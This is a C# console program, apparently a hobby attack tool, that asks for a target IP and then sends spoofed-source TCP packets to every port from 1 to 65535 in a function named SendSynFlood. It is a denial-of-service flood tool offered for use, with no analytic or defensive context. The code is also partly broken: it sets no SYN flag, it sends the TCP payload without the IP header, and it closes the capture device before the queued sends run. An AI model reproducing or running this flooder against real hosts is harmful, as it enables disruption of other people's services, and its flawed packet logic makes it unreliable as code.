
using PacketDotNet;
using SharpPcap;
using System.Net;
using System.Net.NetworkInformation;

Console.Write("Target IP > ");
string szTargetIP = Console.ReadLine();

Random rand = new Random();
byte[] abFakeSrcIP = new byte[4];
rand.NextBytes(abFakeSrcIP);

var devices = CaptureDeviceList.Instance;
for (int i = 0; i < devices.Count; i++)
{
    Console.WriteLine($"[{i + 1}] {devices[i].Description}");
}

Console.Write("Device > ");
var device = devices[int.Parse(Console.ReadLine()) - 1];

device.Open(DeviceModes.Promiscuous);

Console.WriteLine(device.Description);

for (int i = 1; i < 65536; i++)
{
    ThreadPool.QueueUserWorkItem(x => SendSynFlood(device, szTargetIP, i, abFakeSrcIP));
}

device.Close();

Console.ReadKey();

static void SendSynFlood(ICaptureDevice device, string szTargetIP, int nPort, byte[] abFakeSrcIP)
{
    try
    {
        var pktIP = new IPv4Packet(new IPAddress(abFakeSrcIP), IPAddress.Parse(szTargetIP));
        pktIP.Protocol = ProtocolType.Tcp;


        var pktTCP = new TcpPacket(8080, (ushort)nPort);
        pktTCP.SequenceNumber = 12345678;

        pktIP.PayloadPacket = pktTCP;

        ILiveDevice ildevice = (ILiveDevice)device;
        ildevice.SendPacket(pktTCP.Bytes);

        Console.WriteLine("Sent");
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
}